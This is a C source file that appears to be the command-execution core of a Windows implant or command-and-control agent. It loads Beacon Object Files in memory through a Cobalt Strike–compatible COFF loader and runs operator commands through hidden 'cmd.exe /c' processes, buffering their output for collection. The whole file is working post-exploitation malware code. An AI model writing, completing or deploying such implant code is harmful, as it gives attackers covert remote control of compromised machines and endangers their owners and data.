#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>

#include "shell.h"
#include "COFFLoader.h"
#include "beacon_compatibility.h"
#include "config.h"

#define OUTPUT_BUF_SIZE  (256 * 1024)
#define CMD_BUF_SIZE     4096

// ---------------------------------------------------------------------------
// Output buffer
// ---------------------------------------------------------------------------
static char *beacon_buf     = NULL;
static int   beacon_buf_pos = 0;
static int   beacon_buf_cap = 0;
static char  cwd[MAX_PATH]  = {0};

 
int shell_init(void) {
    fprintf(stderr, "[D] shell_init entry\n"); fflush(stderr);
    fprintf(stderr, "[D] calling CoffLoaderInit\n"); fflush(stderr);
    coff_error_t ci = CoffLoaderInit();
    fprintf(stderr, "[D] CoffLoaderInit = %d\n", ci); fflush(stderr);
    if (ci != COFF_SUCCESS) return -1;
    fprintf(stderr, "[D] calloc\n"); fflush(stderr);
    beacon_buf = calloc(OUTPUT_BUF_SIZE, 1);
    fprintf(stderr, "[D] calloc done %p\n", (void*)beacon_buf); fflush(stderr);
    if (!beacon_buf) return -1;
    beacon_buf_cap = OUTPUT_BUF_SIZE;
    GetCurrentDirectoryA(MAX_PATH, cwd);
    fprintf(stderr, "[D] shell_init done\n"); fflush(stderr);
    return 0;
}


void shell_cleanup(void) {
    free(beacon_buf);
    beacon_buf     = NULL;
    beacon_buf_pos = 0;
    beacon_buf_cap = 0;
    CoffLoaderTeardown();  // add this
}

int shell_output_len(void) {
    return beacon_buf_pos;
}

const char *shell_output_buf(void) {
    return beacon_buf;
}

void shell_buf_reset(void) {
    beacon_buf_pos = 0;
    if (beacon_buf) memset(beacon_buf, 0, beacon_buf_cap);
}

void buf_append(const char *data, int len) {
    if (!beacon_buf) return;
    if (beacon_buf_pos + len >= beacon_buf_cap) {
        const char *msg = "[!] Output buffer full\n";
        int msglen = (int)strlen(msg);
        if (beacon_buf_pos + msglen < beacon_buf_cap) {
            memcpy(beacon_buf + beacon_buf_pos, msg, msglen);
            beacon_buf_pos += msglen;
        }
        return;
    }
    memcpy(beacon_buf + beacon_buf_pos, data, len);
    beacon_buf_pos += len;
}

void beacon_log(const char *fmt, ...) {
    if (!beacon_buf) return;
    char tmp[2048];
    va_list args;
    va_start(args, fmt);
    int n = vsnprintf(tmp, sizeof(tmp), fmt, args);
    va_end(args);
    if (n > 0) buf_append(tmp, n);
}

// ---------------------------------------------------------------------------
// BOF execution
// ---------------------------------------------------------------------------
int execute_bof(unsigned char *bof_data, size_t bof_size, char *args, int args_len) {
    coff_error_t result = CoffRunBOF(
        "go",
        (const uint8_t *)bof_data,
        (uint32_t)bof_size,
        NULL,                          // use default allocator
        (uint8_t *)args,
        args_len
    );

    int out_size = 0;
    char *bof_output = BeaconGetOutputData(&out_size);
    if (bof_output && out_size > 0) {
        buf_append(bof_output, out_size);
        free(bof_output);
    }

    return (result == COFF_SUCCESS) ? 0 : 1;
}

// ---------------------------------------------------------------------------
// Shell execution
// ---------------------------------------------------------------------------
static void handle_cd(const char *target) {
    char new_path[MAX_PATH];

    if (!target || target[0] == '\0' || (target[0] == '~' && target[1] == '\0')) {
        const char *home = getenv("USERPROFILE");
        if (!home) home = "C:\\";
        strncpy(new_path, home, MAX_PATH - 1);
        new_path[MAX_PATH - 1] = '\0';
    } else if (target[1] == ':' || target[0] == '\\') {
        strncpy(new_path, target, MAX_PATH - 1);
        new_path[MAX_PATH - 1] = '\0';
    } else {
        snprintf(new_path, MAX_PATH, "%s\\%s", cwd, target);
    }

    DWORD attr = GetFileAttributesA(new_path);
    if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
        beacon_log("cd: not found: %s\n", new_path);
        return;
    }

    char resolved[MAX_PATH];
    if (!GetFullPathNameA(new_path, MAX_PATH, resolved, NULL)) {
        beacon_log("cd: resolve failed\n");
        return;
    }
    strncpy(cwd, resolved, MAX_PATH - 1);
    cwd[MAX_PATH - 1] = '\0';
    SetCurrentDirectoryA(cwd);
    beacon_log("%s\n", cwd);
}

void execute_shell_command(const char *command) {
    if (strncmp(command, "cd", 2) == 0 && (command[2] == ' ' || command[2] == '\0')) {
        handle_cd(command[2] == ' ' ? command + 3 : "");
        return;
    }

    SECURITY_ATTRIBUTES sa = {sizeof(sa), NULL, TRUE};
    HANDLE hRead, hWrite;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        beacon_log("[!] CreatePipe failed: %lu\n", GetLastError());
        return;
    }

    STARTUPINFOA si = {0};
    si.cb        = sizeof(si);
    si.dwFlags   = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;

    PROCESS_INFORMATION pi;
    char cmd_line[CMD_BUF_SIZE + 32];
    snprintf(cmd_line, sizeof(cmd_line), "cmd.exe /c %s", command);

    if (CreateProcessA(NULL, cmd_line, NULL, NULL, TRUE, CREATE_NO_WINDOW,
                       NULL, cwd[0] ? cwd : NULL, &si, &pi)) {
        CloseHandle(hWrite);
        if (WaitForSingleObject(pi.hProcess, 30000) == WAIT_TIMEOUT) {
            TerminateProcess(pi.hProcess, 1);
            beacon_log("[!] Command timed out\n");
        } else {
            DWORD bytes_read;
            char  tmp[4096];
            while (ReadFile(hRead, tmp, sizeof(tmp) - 1, &bytes_read, NULL) && bytes_read > 0) {
                tmp[bytes_read] = '\0';
                buf_append(tmp, (int)bytes_read);
            }
        }
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hRead);
    } else {
        beacon_log("[!] CreateProcess failed: %lu\n", GetLastError());
        CloseHandle(hWrite);
        CloseHandle(hRead);
    }
}